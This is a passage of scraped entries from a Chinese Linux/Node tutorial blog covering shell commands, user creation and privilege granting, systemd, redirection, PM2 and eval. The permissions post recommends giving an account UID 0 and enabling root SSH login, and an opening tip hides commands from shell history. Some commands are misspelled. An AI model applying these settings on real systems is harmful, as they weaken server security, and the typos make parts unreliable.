在终端，只需要在键入命令之前输入一个或多个空格，这样你的命令就不会被记录了。 123456$ hisotry8874 pstree | grep nginx$ date2020年 5月18日 星期一 21时09分03秒 CST$ history8874 pstree | grep nginx 一些其他命令查看系统信息 1$ uname -a 查找发行版信息 1$ lsb_release -a 查看当前日期 1$ date 立即关机 1$ shutdown -h now 重新启动 1$ reboot 输出文件类型信息 12$ file test.txttest.txt: ASCII text 在终端中进行简单的算数运算 12$ expr 1 + 34 重命名文件 123$ mv fileA.txt fileB.txt$ lsfileB.txt nohup 是一个 POSIX 命令，用于忽略 SIGHUP 。 SIGHUP信号是終端注销时所发送至程序的一个信号。 1nohub php script.php type 命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。 123type -a phpphp is &#x2F;usr&#x2F;local&#x2F;bin&#x2F;phpphp is &#x2F;usr&#x2F;bin&#x2F;php 命令类型： alias：别名。 keyword：关键字，Shell保留字。 function：函数，Shell函数。 builtin：内建命令，Shell内建命令。 file：文件，磁盘文件，外部命令。 unfound：没有找到。 查找进程 1ps -aux | grep php 注意：每个操作系统的ps版本略有不同，Ubuntu 和Mac 上可以直接使用-aux参数，但可能其他系统不能加破折号。参考链接：Linux ps command help and example 杀死进程 根据 pid（会杀死指定pid 的进程） 1kill -9 [pid] 根据进程名称（会杀死一组同名进程） 1killall php 全局根据文件名查找文件具体路径有时候很想找到某个文件，但是又不记得具体路径了，这时可以使用 find 命令： 1find &#x2F; -name &lt;file name&gt; 参考链接 鲜为人知而又实用的 Linux 命令","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux 添加用户以及权限分配","slug":"linux-add-users-and-assign-permissions","date":"2020-07-15T15:19:14.000Z","updated":"2020-07-16T15:29:23.772Z","comments":true,"path":"linux-add-users-and-assign-permissions/","link":"","permalink":"https://www.0x2beace.com/linux-add-users-and-assign-permissions/","excerpt":"写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。 另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。","text":"写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。 另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。 添加用户在 Linux 上，添加用户有两种方式：useradd和adduser，其区别就是： useradd 是一个Linux 命令，它提供很多参数给用户根据自己的需要进行设置。 adduser 则是一个perl 脚本，在使用时通过简单的人机交互界面，供用户进行个性设置。 adduser相比 useradd，adduser的使用要简单很多。 使用adduser 添加一个用户： 1$ adduser boo 然后根据提示填写相应的内容，需要注意的是，该命令会自动的在 /home 目录下创建一个与用户同名的目录。 用 adduser 这个命令创建的账号是系统账号，可以用来登录到 ubuntu系统。 useradduseradd 命令有大量的参数供我们进行个性设置，常用参数如下： -d&lt;登入目录&gt;：指定用户登入时的启始目录，并赋予用户对该目录的的完全控制权\u001c -g&lt;群组&gt;：指定用户所属的群组； -G&lt;群组&gt;：指定用户所属的附加群组； -m：在 /home 目录下自动建立用户的登入目录； -r：建立系统帐号； -s：指定用户登入后所使用的shell； -u：指定用户的 id 使用 useradd 创建用户的一般步骤如下： 1234$ useradd -m boo -s &#x2F;bin&#x2F;bash$ passwd boo$ ls &#x2F;home&#x2F;boo 其中要注意的有： useradd 命令如果不带任何参数（useradd boo），表示只是创建一个用户，既没有 /home 目录下的同名文件夹，也没有设置密码，但是可以在 /etc/passwd 文件的最后一行看到刚才添加的用户。 useradd 这个命令创建的是普通账号，并不能用来登录系统。加上参数-r，将该用户加入到系统用户，系统用户为 id在 1000以下的用户，而普通用户则是id 在 1000以上。事实证明 无论是普通用户还是系统用户 只要密码输入正确都能登入系统。 当使用参数-m的时候，系统会自动地在 /home 目录下建立一个与新建用户同名的用户主文件夹；如果不使用-m的话，那么就默认是使用-M参数，不创建主文件夹，即使你使用了-d这个参数。所以如果想要自己选择主文件夹，需要同时加上-m和-d参数。 误区：很都时候刚拿到一台新的机器，会发现用户目录下只有一个当前用户的文件夹，不要误以为该系统只有你一个用户，是因为很多系统用户的主目录并不在 /home 下。 权限分配提权无论是使用 adduser 还是 useradd 创建的用户，都试着执行一下以下命令： 1$ sudo apt-get install vim 不出意外，你肯定会得到这样一个错误： 12[sudo] password for boo:boo is not in the sudoers file. This incident will be reported. 这个错误的意思是说该用户并不在 sudoers 文件中，那么该如何解决呢？ 使用如下命令： 1234567$ sudo visudo# Members of the admin group may gain root privileges%admin ALL&#x3D;(ALL) ALL# 找到该注释，在其下增加一行 %yourusername ALL&#x3D;(ALL) ALL 然后保存退出，就会发现可以使用 sudo 提权了。 赋予 root 权限这里有三种方式，先来看看最简单的方式： 方式一： 1234$ sudo vim &#x2F;etc&#x2F;passwd# 将用户id 改为 0testuser1:x:0:1001::&#x2F;home&#x2F;testuser1:&#x2F;bin&#x2F;sh 需要注意的是： 该方法适用于普通用户以及管理员用户 使用 testuser1 账户登录后，直接获取的就是 root 帐号的权限。 方式二：（这里以ubuntu 系统为例） 1234567$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# Allow members of group sudo to execute any command%sudo ALL&#x3D;(ALL:ALL) ALL# 在其后面增加一行%wheel ALL&#x3D;(ALL:ALL) ALL 然后修改该用户，使其属于 root 组（wheel）： 1$ usermod -g root boo 修改完成之后，使用boo 用户登入，执行命令：su -，输入 root 账户的密码，即可获得root 权限。 方式三：（这里以ubuntu 为例） 12345$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# User privilege specificationroot ALL&#x3D;(ALL:ALL) ALLboo ALL&#x3D;(ALL:ALL) ALL 修改完成之后，使用boo 用户登入，执行命令：su -，输入 root 账户的密码，即可获得root 权限。 方式二、方式三和方式一的区别就是：前者需要知道root 账户的密码，而后者可以直接以普通用户的身份或者管理员身份获取root 权限。 另外还有一个需要注意的地方就是：使用第一种方式获取 root 权限，其实也有弊端，弊端就是 远程使用该用户登入时，还是需要输入 root 密码，才能验证身份成功，是的 必须输入 root 用户的密码。 事实证明，并非上面所述，ssh 连接时的确需要输入密码验证，但不是 root 用户的密码，之前之所以一直看到 Permission denied, please try again.这样的错误，只是因为 没有开启允许 root 用户远程登入的权限。如何开启，见下文扩展补充。 扩展补充在Ubuntu中如何修改 root 密码默认情况下，出于安全原因，root用户帐户密码在Ubuntu Linux 中被锁定。因此，无法使用root用户登录或使用诸如su -之类的命令成为超级用户。 但可以借助其他方式，使用passwd命令来修改。因为普通用户只能更改其帐户的密码。超级用户（root）可以更改任何用户帐户的密码（包括它自己）。 使用以下命令成为 root用户： 12$ sudo -i$ passwd root 如果在sudo 命令使用不了的情况下，可以进入单用户模式，再进行修改 1$ passwd root 在Ubuntu中如何远程 root 登入在Ubuntu中，默认是不能使用 root 账户登入到系统的，如果一定想要用 root账户登入，可以编辑 sshd 配置，执行如下操作： 12345678$ sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config# PermitRootLogin prohibit-password# 修改为：# PermitRootLogin yes# 重启sshd 服务$ sudo systemctl restart sshd 参考链接 adduser 和 useradd 的区别 Ubuntu 如何进入单用户模式 ssh-如何远程以root 登入 如何在Ubuntu Linux 中更改 root 密码 如何使用su / sudo成为Ubuntu Linux的超级用户？ Ubuntu Linux root 用户默认密码","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux init、service、systemctl 这三者之间的区别","slug":"the-difference-between-linux-init-service-systemctl","date":"2020-07-14T15:38:00.000Z","updated":"2020-07-14T15:39:41.990Z","comments":true,"path":"the-difference-between-linux-init-service-systemctl/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-linux-init-service-systemctl/","excerpt":"在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是init、service、systemctl。 至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。","text":"在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是init、service、systemctl。 至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。 init历史上，Linux 的启动一直采用init 进程。 在类Unix 的计算机操作系统中，Init（初始化的简称）是在启动计算机系统期间启动的第一个进程。 Init 是一个守护进程，它将持续运行，直到系统关闭。它是所有其他进程的直接或间接的父进程。 因为init 的参数全在/etc/init.d目录下，所以使用 init 启动一个服务，应该这样做： 1$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start service通过查看man 手册页可以得知，service是一个运行System V init的脚本命令。 那么什么是 System V init 呢？ 也就是/etc/init.d 目录下的参数。 所以分析可知service 是去/etc/init.d目录下执行相关程序，服务配置文件的存放目录就是/etc/init.d. 使用 service 启动一个服务 1$ service nginx start 可以理解成 service 就是init.d 的一种实现方式。所以这两者启动方式（或者是停止、重启）并没有什么区别。 123$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start&#x2F;&#x2F; 等价于$ service nginx start 但是这两种方式均有如下缺点： 启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。 启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。 systemdSystemd 就是为了解决这些问题而诞生的。它包括 System and Service Manager，为系统的启动和管理提供一套完整的解决方案。Systemd 是Linux 系统中最新的初始化系统（init），它主要的设计目的是克服 System V init固有的缺点，提高系统的启动速度。 根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。 使用了 Systemd，就不需要再用init 了。Systemd 取代了initd（Initd 的PID 是0） ，成为系统的第一个进程（Systemd 的PID 等于 1），其他进程都是它的子进程。 Systemd 的优点是功能强大，使用方便，缺点是体系庞大，非常复杂。 查看Systemd 的版本信息 1$ systemctl --version 系统管理Systemd 并不是一个命令，而是一组命令，涉及到系统管理的方方面面。 systemctlsystemctl是 Systemd 的主命令，用于管理系统。 12345678&#x2F;&#x2F; 重启系统$ sudo systemctl reboot&#x2F;&#x2F; 启动进入救援状态（单用户状态）$ sudo systemctl rescue&#x2F;&#x2F; 管理服务$ sudo systemctl start nginx hostnamectlhostnamectl命令用于查看当前主机的信息。 12345&#x2F;&#x2F; 显示当前主机信息$ hostnamectl&#x2F;&#x2F; 设置主机名$ sudo hostnamectl set-hostname BoodeUbuntu localectllocalectl命令用于查看本地化设置。 123456&#x2F;&#x2F; 查看本地化设置$ localectl&#x2F;&#x2F; 设置本地化参数。$ sudo localectl set-locale LANG&#x3D;en_GB.utf8$ sudo localectl set-keymap en_GB timedatectltimedatectl命令用于查看当前时区设置。 12345678910&#x2F;&#x2F; 查看当前时区设置$ timedatectl&#x2F;&#x2F; 显示所有可用的时区$ timedatectl list-timezones &#x2F;&#x2F; 设置当前时区$ sudo timedatectl set-timezone America&#x2F;New_York$ sudo timedatectl set-time YYYY-MM-DD$ sudo timedatectl set-time HH:MM:SS 总结一下，init 是最初的进程管理方式，service 是init 的另一种实现，而 systemd 则是一种取代 initd 的解决方案，其中 systemctl 是 systemd 的主命令，用于管理系统以及服务。 参考链接 Linux Init - 维基百科 Systemd 入门教程 - 阮一峰的网络日志 init、service、systemctl 的区别 Linux 守护进程的启动方式","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"了解 Linux的管道符、重定向、环境变量","slug":"understand-linux-pipe-symbols-redirects-environment-variables","date":"2020-07-13T15:48:12.000Z","updated":"2020-07-14T15:49:18.916Z","comments":true,"path":"understand-linux-pipe-symbols-redirects-environment-variables/","link":"","permalink":"https://www.0x2beace.com/understand-linux-pipe-symbols-redirects-environment-variables/","excerpt":"这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。","text":"这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。 输入输出重定向在了解什么是输入输出重定向之前，我们先要搞清楚以下两种输出信息的区别： 标准输出信息：包括该文件的一些相关权限、所有者、所属组、文件大小及修改时间等信息。 错误输出信息：Bash终端显示的报错提示信息123456[max@localhost 桌面]$ lstestdir test.txt[max@localhost 桌面]$ cat test.txtHello Linux! # 标准输出信息[max@localhost 桌面]$ cat xxxcat: xxx: 没有那个文件或目录 # 错误输出信息 因为不存在xxx文件 标准输入重定向（STDIN，文件描述符为0）：默认从键盘输入，也可从其他文件或命令中输入。 标准输出重定向（STDOUT，文件描述符为1）：默认输出到屏幕。 错误输出重定向（STDERR，文件描述符为2）：默认输出到屏幕。 之所以花这么大力气，理解这个概念，是因为待会有个很重要的知识点要用到这个概念。 输出重定向123456命令 &gt; 文件 将标准输出重定向到一个文件中（清空原有文件的数据）命令 2&gt; 文件 将错误输出重定向到一个文件中（清空原有文件的数据）命令 &gt;&gt; 文件 将标准输出重定向到一个文件中（追加到原有内容的后面）命令 2&gt;&gt; 文件 将错误输出重定向到一个文件中（追加到原有内容的后面）命令 &gt;&gt; 文件 2&gt;&amp;1 或命令 &amp;&gt;&gt; 文件 将标准输出与错误输出共同写入到文件中（追加到原有内容的后面） 实例： 12345678910[max@localhost 桌面]$ cat test.txtHello Linux![max@localhost 桌面]$ echo &quot;测试输出重定向(追加模式)&quot; &gt;&gt; test.txt[max@localhost 桌面]$ cat test.txt Hello Linux!测试输出重定向(追加模式)[max@localhost 桌面]$ echo &quot;测试输出重定向(清除模式)&quot; &gt; test.txt[max@localhost 桌面]$ cat test.txt测试输出重定向(清除模式) 输入重定向123命令 &lt; 文件 将文件作为命令的标准输入命令 &lt;&lt; 分界符 从标准输入中读入，直到遇见分界符才停止命令 &lt; 文件1 &gt; 文件2 将文件1作为命令的标准输入并将标准输出到文件2 输入重定向相对于输出重定向较使用的少一些，可以理解为：输入重定向的作用是把文件直接导入到命令中。例子： 123# 将文件text.txt导入给 &#96;wc -l&#96;命令，统计行数。[max@localhost 桌面]$ wc -l &lt; test.txt1 管道符管道符的概念就是：把前一个命令原本要输出到屏幕的标准正常数据当作是后一个命令的标准输入。 举个例子，把etc目录下的所有文件的属性信息，作为标准输入传递给 more命令。 12345678[max@localhost 桌面]$ ls -l &#x2F;etc&#x2F; | more总用量 1396drwxr-xr-x. 3 root root 97 8月 24 04:35 abrt-rw-r--r--. 1 root root 16 8月 24 04:43 adjtime-rw-r--r--. 1 root root 21929 1月 29 2014 brltty.confdrwxr-xr-x. 2 root root 6 1月 29 2014 chkconfig.d-rw-r--r--. 1 root root 1157 2月 6 2014 chrony.conf--More-- 命令行中的通配符 星号（*）代表匹配零个或多个字符 问号（?）代表匹配单个字符 中括号内加上数字[0-9]代表匹配0～9之间的单个数字的字符 而中括号内加上字母[abc]则是代表匹配a、b、c三个字符中的任意一个字符123456789101112131415161718[max@localhost test]$ lsfile1 file2 file3 file99 filex[max@localhost test]$ ls -l file?-rw-rw-r--. 1 max max 0 10月 10 22:49 file1-rw-rw-r--. 1 max max 0 10月 10 22:49 file2-rw-rw-r--. 1 max max 0 10月 10 22:49 file3-rw-rw-r--. 1 max max 0 10月 10 22:49 filex[max@localhost test]$ ls -l file*-rw-rw-r--. 1 max max 0 10月 10 22:49 file1-rw-rw-r--. 1 max max 0 10月 10 22:49 file2-rw-rw-r--. 1 max max 0 10月 10 22:49 file3-rw-rw-r--. 1 max max 0 10月 10 22:49 file99-rw-rw-r--. 1 max max 0 10月 10 22:49 filex[max@localhost test]$ ls -l file[1-2]-rw-rw-r--. 1 max max 0 10月 10 22:49 file1-rw-rw-r--. 1 max max 0 10月 10 22:49 file2[max@localhost test]$ ls -l file[x]-rw-rw-r--. 1 max max 0 10月 10 22:49 filex 常用的转义字符 反斜杠（\\）：使反斜杠后面的一个变量变为单纯的字符串。 单引号（’’）：转义其中所有的变量为单纯的字符串。 双引号（””）：保留其中的变量属性，不进行转义处理。 反引号（``）：把其中的命令执行后返回结果。 123[max@localhost test]$ PRICE&#x3D;5[max@localhost test]$ echo &quot;The price of this shirt is $PRICE&quot;The price of this shirt is 5 上面的输出看上去挺对的，但是并不完美，我们希望能够输出“The price of this shirt is $5”，于是我们试着这样写： 12[max@localhost test]$ echo &quot;The price of this shirt is $$PRICE&quot;The price of this shirt is 9944PRICE 不幸的是美元符号和变量提取符号合并后$$作用是显示当前程序的进程ID。 要想让第一个$乖乖地作为美元符号，那么就需要使用反斜杠\\来进行转义，将这个命令提取符转义成单纯的文本，去除其特殊功能。 12[max@localhost test]$ echo &quot;The price of this shirt is \\$$PRICE&quot;The price of this shirt is $5 如果只需要某个命令的输出值时，可以像命令这样，将命令用反引号括起来，达到预期的效果. 123[max@localhost test]$ echo &#96;uname -a&#96; &gt;&gt; file1[max@localhost test]$ cat file1Linux localhost.localdomain 3.10.0-123.el7.x86_64 #1 SMP Mon May 5 11:16:57 EDT 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux 思考：如何将普通变量转换为全局变量？ 使用命令：export [变量名称]，需要在拥有管理员权限时才能正常使用。 12345678910111213141516[root@localhost home]# WORKDIR&#x3D;&#x2F;home&#x2F;workdir[root@localhost home]# mkdir $WORKDIR [root@localhost home]# cd $WORKDIR[root@localhost workdir]# pwd&#x2F;home&#x2F;workdir[root@localhost workdir]# exitexit[max@localhost home]$ cd $WORKDIR[max@localhost ~]$ echo $WORKDIR[max@localhost ~]$ su root密码：[root@localhost max]# export WORKDIR[root@localhost &#x2F;]# su max[max@localhost &#x2F;]$ cd $WORKDIR[max@localhost workdir]$ pwd&#x2F;home&#x2F;workdir 重点一：在上面的命令中有一个很重要的知识点： 关于如何在Linux中创建一个变量的问题？有两个地方需要注意。 所有字母都需要大写 变量与赋值符号(=)之间不能存在空格 无论是系统环境变量还是自定义变量还是全局变量，在调用时 都需要使用$符号来标识。 重点二 在Linux 系统中当普通用户身份时命令提示符的前缀标识是：$。 在Linux 系统中当为管理员身份时命令提示符的前缀标识是：#。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"PM2 快速上手","slug":"pm2-quick-start","date":"2020-07-12T13:44:47.000Z","updated":"2020-09-04T13:54:47.036Z","comments":true,"path":"pm2-quick-start/","link":"","permalink":"https://www.0x2beace.com/pm2-quick-start/","excerpt":"PM2 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。","text":"PM2 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。 安装 1$ npm install pm2 -g 无缝更新 1$ pm2 update 启动应用PM2 中有两种方式启动应用，一种是直接调用应用入口文件，一种是通过调用配置文件启动应用。 命令行启动在生产环境中，通过命令行启动服务 1$ pm2 stat app.js 配置文件启动很多时候，仅仅只是使用 PM2 去启动应用，可能不能完全满足我们的需求。 当需要对应用有更多的要求时，这个时候就需要用到PM2 的配置文件了。 PM2 支持通过配置文件创建管理应用，首先在项目根目录手动创建配置文件precesses.json： 12345678910&#123; &quot;apps&quot;: [ &#123; &quot;name&quot;: &quot;myApp&quot;, &quot;cwd&quot;: &quot;&#x2F;var&#x2F;www&#x2F;app&#x2F;&quot;, &quot;script&quot;: &quot;.&#x2F;app.js&quot;, &quot;watch&quot;: true &#125; ]&#125; 或者直接使用 pm2 init 命令，自动创建默认的ecosystem.config.js配置文件： 1234567module.exports &#x3D; &#123; apps : [&#123; name: &quot;myApp&quot;, script: &#39;index.js&#39;, watch: &#39;.&#39; &#125;&#125;; 这两种方式都可以创建管理应用，作用都是一样的，区别只是：一个是json格式的配置文件，一个是js格式的配置文件。 上面是一个最简单的processes.json配置，创建了一个myApp应用，如果你有多个服务，那么apps 这个数组中创建多个应用。 创建好配置文件之后，那么该如何启动呢？ 有两种方式： 直接调用配置文件启动 1$ pm2 start processes.json 可以增加--env参数，来指定当前启动环境。 通过package.json 配置文件，配置脚本启动 123456&#x2F;&#x2F; package.json&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;node server&#x2F;index&quot;, &quot;pm2&quot;: &quot;pm2 start processes.json&quot; &#125; 然后就可以直接使用npm start pm2 来启动应用了。 参数说明在配置文件你可以指定环境变量、日志文件、进程文件，重启最大次数…等配置项。支持JSON和YAML格式。 PM2 的配置支持非常多的参数，下面会对常用的参数一一做说明。 字段 类型 值 描述 name string myApp 应用的名字，默认是脚本文件名 cwd string /var/www/myApp 应用程序所在目录 script string ./server.js 应用程序的脚本路径，相对于应用程序所在目录 log_date_format string YYYY-MM-DD HH:mm Z 日志时间格式 error_file string - 错误日志存放路径 out_file string - 输出日志存放路径 pid_file string - pid文件路径 watch boolean or array true 当目录文件或子目录文件有变化时自动重新加载应用 ignore_watch list [”[/]./”, “node_modules”] list中的正则匹配的文件和目录有变化时不重新加载应用 max_memory_restart string 50M 当应用超过设定的内存大小就自动重启 min_uptime string 60s 最小运行时间，这里设置的是60s即如果应用程序在60s内退出，pm2会认为程序异常退出，此时触发重启max_restarts设置数量 max_restarts number 10 设置应用程序异常退出重启的次数，默认15次（从0开始计数） instances number 1 启动实例个数 cron_restart string 1 0 * * * 定时重启 exec_interpreter string node 应用程序的脚本类型，默认是node exec_mode string fork 应用启动模式，支持fork和cluster模式，默认为fork autorestart boolean true 应用程序崩溃或退出时自动重启 有以下几点需要注意 ⚠️： 如果processes.json或者ecosystem.config.js 配置文件如果发生了变化，建议直接删除应用之后，重新创建，否则可能部分配置不会生效。 cwd 不要填绝对路径，建议用相对路径，./表示相对于配置文件根目录，否则可能会出现静态资源丢失的情况。 进程监控列出所有节点应用程序（进程/微服务） 12$ pm2 list$ pm2 ls 可以将进程列表以JSON格式打印出来： 12$ pm2 jlist$ pm2 prettylist 使用进程ID或名称查看所示的单个Node进程的详细信息： 12$ pm2 describe &lt;id | app_name&gt;$ pm2 show &lt;id | app_name&gt; 实时监控所有进程CPU或内存使用情况： 1$ pm2 monit 日志管理查看某个应用的日志： 1$ pm2 logs [&#39;all&#39; | app_name | app_id ] 1234$ pm2 logs --json # JSON 格式输出$ pm2 logs --format # 格式化 output$ pm2 flush # 清空所有日志文件$ pm2 reloadLogs # 重新加载所有日志文件 常用命令停止进程 1$ pm2 stop [&#39;all&#39; | app_name | app_id ] 重启进程 1$ pm2 restart [&#39;all&#39; | app_name | app_id ] 0秒停机重载进程 (用于 NETWORKED 进程) 1$ pm2 reload all 杀死进程 1$ pm2 delete [&#39;all&#39; | app_name | app_id ] 使用PM2 运行 npm startnpm run xxxx 是 node常用的启动方式之一，那么如何使用PM2来实现对该方式的启动呢？ npm run、npm start等命令之所以可以使用，是因为package.json配置文件中增加了对应的脚本命令。 1234&quot;scripts&quot;: &#123; &quot;start-dev&quot;: &quot;env $(cat .env | xargs) nodemon server&#x2F;index&quot;, &quot;start&quot;: &quot;node server&#x2F;index&quot;, &#125; 语法： 1pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt;; 其中 --watch监听代码变化，--name重命名任务名称，-- run后面跟脚本名字 实例： 12&#x2F;&#x2F; 等效于 npm startpm2 start npm --watch --name webserver -- run start 稳定运行PM2 是一款非常优秀的 Node 进程管理工具，它有着丰富的特性，能够充分利用多核CPU且能够负载均衡、能够帮助应用在崩溃后、指定时间(cluster model)和超出最大内存限制等情况下实现自动重启。 为了保证能够稳定运行，可以参考以下几点建议： 应用进程运行时间久了或许总会产生一些意料之外的问题，定时重启可以规避一些不可测的情况； 最大内存限制，根据观察设定合理内存限制，保证应用异常运行； min_uptime，min_uptime 是应用正常启动的最小持续运行时长，合理设置设置此范围，可以将超出时间判定为异常启动； 设定异常重启延时restart_delay，对于异常情况导致应用停止，设定异常重启延迟可防止应用在不可测情况下不断重启的导致重启次数过多等问题； 设置异常重启次数，如果应用不断异常重启，并超过一定的限制次数，说明此时的环境长时间处于不可控状态，服务器异常。此时便可停止尝试，发出错误警告通知等。 参考链接 pm2 从入门到精通 如何在生产服务器上安装PM2运行Node.js应用程序 PM2 配置文件说明解析 PM2 应用配置文件解析 PM2 实用手册 PM2 用法详解 使用pm2 自动部署node项目 PM2 中文文档","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"},{"name":"进程管理","slug":"Node/Tutorial/进程管理","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"进程管理","slug":"进程管理","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}]},{"title":"Linux 中的eval、反引号、$()的区别","slug":"the-difference-between-eval-and-backquotes-in-linux-and","date":"2020-07-11T12:41:10.000Z","updated":"2020-07-11T12:46:46.350Z","comments":true,"path":"the-difference-between-eval-and-backquotes-in-linux-and/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-eval-and-backquotes-in-linux-and/","excerpt":"之前在搭建 SSH 环境时，遇到了这样一个问题： 使用命令：eval$(ssh-agent)去创建一个代理进程，但是会提示：No Such file or directory 。 就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？ 后来，了解到原来一直使用的 eval$(ssh-agent) ，其中的$() 原来在Linux中有特殊的意义。 所以这篇笔记专门用来了解 eval 和 反引号 以及 $()之间的区别。 它们的作用都是命令替换。","text":"之前在搭建 SSH 环境时，遇到了这样一个问题： 使用命令：eval$(ssh-agent)去创建一个代理进程，但是会提示：No Such file or directory 。 就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？ 后来，了解到原来一直使用的 eval$(ssh-agent) ，其中的$() 原来在Linux中有特殊的意义。 所以这篇笔记专门用来了解 eval 和 反引号 以及 $()之间的区别。 它们的作用都是命令替换。 场景重现12345678910$ &#96;ssh-agent&#96;sh.exe&quot;: SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-myYvgp1404&#x2F;agent.1404;: No such file or directory$ eval ssh-agentSSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-zIQZKN6080&#x2F;agent.6080; export SSH_AUTH_SOCK;SSH_AGENT_PID&#x3D;1092; export SSH_AGENT_PID;echo Agent pid 1092;$ eval &#96;ssh-agent&#96;Agent pid 4288 直到我输入 eval ssh-agent 时，似乎就对了。 命令代换这三种不同的方式都是shell脚本中的命令代换。 命令代换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。 eval首先要介绍的是: eval 它的作用是：重新运算求出参数的内容。 该命令使用于那些一次扫描无法实现其功能的变量。该命令对变量进行两次扫描。 1234567891011$ touch test.txt$ vim test.txt &#x2F;&#x2F; 写入 Hello eval$ var&#x3D;&quot;cat test.txt&quot;&#x2F;&#x2F; 注意：中间没有空格，前面没有美元符号。$ echo $varcat test.txt$ eval $varHello eval 反引号与 $()实例一： 12345678910$ DATE1&#x3D;$(date)$ DATE2&#x3D;&#96;date&#96;$ DATE3&#x3D;&#96;eval date&#96;$ echo $DATE12019年01月23日 21:20:36$ echo $DATE22019年01月23日 21:20:36$ echo $DATE32019年01月23日 21:20:36 实例二： 1234$ echo &#96;echo &#39;\\\\&#39;&#96; \\$ echo $(echo &#39;\\\\&#39;)\\\\ 暂时没太明白这三者的实际应用场景，不过了解到了 它们之间的一些区别与联系。 参考链接： https://kyle.io/2012/09/ssh-agent-messiness-solving-it/ shell脚本中命令代换：反引号、$()、eval区别 shell脚本中命令代换：反引号、$()、eval区别2","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux 中的Shell 种类","slug":"shell-types-in-linux","date":"2020-07-11T12:36:46.000Z","updated":"2020-07-11T12:41:49.331Z","comments":true,"path":"shell-types-in-linux/","link":"","permalink":"https://www.0x2beace.com/shell-types-in-linux/","excerpt":"什么是Shell？","text":"什么是Shell？ Shell 是一个程序，其作用是将用户输入的命令发送到OS（系统内核）。 据说它起源于作为存在于OS 内部和用户之间的外壳的依附着。所以为形象的称作为 壳（Shell）。 Shell 的种类Linux Shell 的种类很多，目前流行的Shell 